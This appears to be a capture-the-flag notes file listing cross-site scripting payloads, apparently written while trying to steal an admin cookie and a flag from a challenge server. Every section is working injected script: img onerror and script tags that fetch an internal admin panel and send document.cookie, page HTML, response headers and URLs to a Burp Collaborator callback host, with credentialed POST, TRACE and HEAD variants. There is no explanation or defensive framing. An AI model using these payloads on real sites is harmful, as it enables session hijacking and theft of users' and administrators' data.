# Initial Callback Payload for Testing
```
<img src=http://sdsdsdsd.com/x onerror=fetch("http://<callback_id>.burpcollaborator.net")/>

<script>fetch("http://<callback_id>.burpcollaborator.net/?c="+document.cookie)</script>

<script>fetch("http://<callback_id>.burpcollaborator.net/?c="+document.location)</script>
```

# Try to get cookie by triggerring a page visit
```
<script>fetch("http://0.0.0.0:8080/Secret_admin_cookie_panel").then(response => response.text()).then(html => {return fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(document.cookie))});</script>
```

# POST callback with contents of page
```
<script>fetch("http://0.0.0.0:8080/Secret_admin_cookie_panel").then(response => response.text()).then(html => {return fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(document.cookie),{method:'POST', credentials:'include', body: html})});</script>
```

# Callback with headers
```
<script>fetch("http://0.0.0.0:8080/Secret_admin_cookie_panel").then(response => {return fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(response.headers.entries()))});</script>

<script>fetch("http://0.0.0.0:8080/Secret_admin_cookie_panel",{credentials: 'include'}).then(response => {for (var pair of response.headers.entries()) { fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(pair[0]+":"+pair[1]),{credentials: 'include'})}; return fetch("http://<callback_id>.burpcollaborator.net/?c=done"+":"+document.cookie,{credentials: 'include'});});</script>
```

# Enforce credentials
```
<script>fetch("http://0.0.0.0:8080/Secret_admin_cookie_panel", {method: 'GET',credentials: 'include'}).then(response => {return fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(document.cookie))});</script>
```

# Record headers and contents of the response
```
<script>fetch("http://0.0.0.0:8080/Secret_admin_cookie_panel",{method:'TRACE', credentials:'include'}).then(response => response.text()).then(html => {return fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(document.URL),{method:'POST', credentials:'include', body: html})});</script>

<script>fetch("http://0.0.0.0:8080/Secret_admin_cookie_panel",{method:'HEAD', credentials:'include'}).then(response => response.text()).then(html => {return fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(document.URL),{method:'POST', credentials:'include', body: html})});</script>

<script>fetch("http://<callback_id>.burpcollaborator.net/?c=".concat("start"));try {var xmlhttp = new XMLHttpRequest();var url = 'http://0.0.0.0:8080/Secret_admin_cookie_panel';xmlhttp.withCredentials = true; xmlhttp.open('TRACE', url, false);xmlhttp.send();fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(xmlhttp.responseText));} catch(err) {fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(err))}; fetch("http://<callback_id>.burpcollaborator.net/?c=".concat("done"));</script>

<script>fetch("http://<callback_id>.burpcollaborator.net/?c=".concat("start"));try {var xmlhttp = new XMLHttpRequest();var url = 'http://0.0.0.0:8080/Secret_admin_cookie_panel';xmlhttp.withCredentials = false;xmlhttp.open('HEAD', url, false);xmlhttp.send();fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(xmlhttp.getAllResponseHeaders()));} catch(err) {fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(err))}; fetch("http://<callback_id>.burpcollaborator.net/?c=".concat("done"));</script>

<script>fetch("http://0.0.0.0:8080/Secret_admin_cookie_panel",{method: 'HEAD'}).then(response => {for (var pair of response.headers.entries()) { fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(pair[0]+":"+pair[1]),{credentials: 'include'})}; return fetch("http://<callback_id>.burpcollaborator.net/?c=done"+":"+document.cookie,{credentials: 'include'});});</script>
```

# Missing the flag page, it was way easier...
```
<script>fetch("http://0.0.0.0:8080/flag").then(response => response.text()).then(html => {return fetch("http://<callback_id>.burpcollaborator.net/?c=".concat(html))});</script>
```